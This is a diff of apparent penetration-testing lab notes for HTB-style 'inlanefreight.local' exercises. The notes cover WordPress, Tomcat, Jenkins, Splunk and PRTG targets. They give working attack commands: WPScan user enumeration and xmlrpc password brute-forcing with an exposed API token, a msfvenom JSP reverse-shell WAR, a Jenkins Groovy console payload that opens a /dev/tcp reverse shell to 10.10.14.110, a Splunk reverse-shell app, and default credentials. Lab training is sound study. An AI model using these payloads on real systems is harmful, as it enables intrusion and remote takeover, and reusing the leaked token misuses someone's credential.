@@ -35,7 +35,7 @@ curl -s http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readm
 Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present? 
 
 ```bash
-sudo wpscan --url http://blog.inlanefreight.local --enumerate u  --api-token paYKDK1ev8wFy9mX5A5ppyHVkoM9WjPpIMPzItVjTFM
+sudo wpscan --url http://blog.inlanefreight.local --enumerate u  --api-token paYKDK1ev8wFymX5A5ppyHVkoM9WjPpIMPzItVjTFM
 
 ```
 
@@ -44,7 +44,7 @@ Perform a login bruteforcing attack against the discovered user. Submit the user
 ```bash
 # login and go to http://blog.inlanefreight.local/wp-admin/theme-editor.php
 
-sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /home/avataris12/CTF/CTF_2023/desconstru_ctf/Forensics/Hash_Roll/rockyou.txt --url http://blog.inlanefreight.local --api-token paYKDK1ev8wFy9mX5A5ppyHVkoM9WjPpIMPzItVjTFM
+sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /home/avataris12/CTF/CTF_2023/desconstru_ctf/Forensics/Hash_Roll/rockyou.txt --url http://blog.inlanefreight.local --api-token paYKDK1ev8wFymX5A5ppyHVkoM9WjPpIMPzItVjTFM
 
 python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 ```
@@ -181,8 +181,84 @@ zip -r backup.war cmd.jsp
 
 curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.110 LPORT=4443 -f war > backup.war
 
 nc -lnvp 4443
 
+/opt/tomcat/apache-tomcat-10.0.10/webapps/
+
 ```
+
+# Jenkins - Discovery & Enumeration
+
+Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.
+
+```bash
+#admin:admin
+
+CTRL+U
+
+```
+
+Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory 
+
+```bash
+
+#go to http://jenkins.inlanefreight.local:8000/script
+#payload
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.110/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+
+nc -lvnp 8443
+
+```
+
+# Splunk - Discovery & Enumeration
+
+Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).
+
+```bash
+# go to https://10.129.201.50:8000/en-US/app/launcher/home
+
+```
+# Attacking Splunk
+
+Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory. 
+
+```bash
+# go to https://10.129.201.50:8000/en-US/manager/search/apps/local
+
+git clone https://github.com/0xjpuff/reverse_shell_splunk.git
+
+# set up the all the files to run.ps1 run.bat run.py inputs.conf
+# tar the directory
+# Install App From File 
+ sudo nc -lnvp 443 
+```
+
+# PRTG Network Monitor
+
+What version of PRTG is running on the target? 
+```bash
+# prtgadmin:Password123
+
+url -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
+
+
+```
+Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop. 
+
+```bash
+
+```
+
+# osTicket
+
+Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson . 
+
+```
+
+``` 
